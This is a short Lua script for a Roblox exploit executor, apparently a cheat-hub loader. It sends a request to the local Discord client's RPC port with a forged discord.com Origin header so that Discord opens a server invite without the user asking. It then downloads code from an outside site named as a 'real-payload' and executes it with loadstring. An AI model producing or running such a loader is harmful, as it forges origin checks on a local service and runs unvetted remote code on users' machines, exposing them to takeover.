 local HttpService = game:GetService('HttpService')
  local request = (syn and syn.request) or (fluxus and fluxus.request) or (http and http.request) or http_request or request
    
  if request then
      pcall(function()
          request({
              Url = 'http://127.0.0.1:6463/rpc?v=1',
              Method = 'POST',
              Headers = {
                  ['Content-Type'] = 'application/json',
                  Origin = 'https://discord.com'
              },
              Body = HttpService:JSONEncode({
                  cmd = 'INVITE_BROWSER',
                  nonce = HttpService:GenerateGUID(false),
                  args = {code = "MmZxyDFgR6"}
              })
          })
      end)
    end
    
loadstring(game:HttpGet("https://rebelhub.pro/loader/real-payload.lua"))()
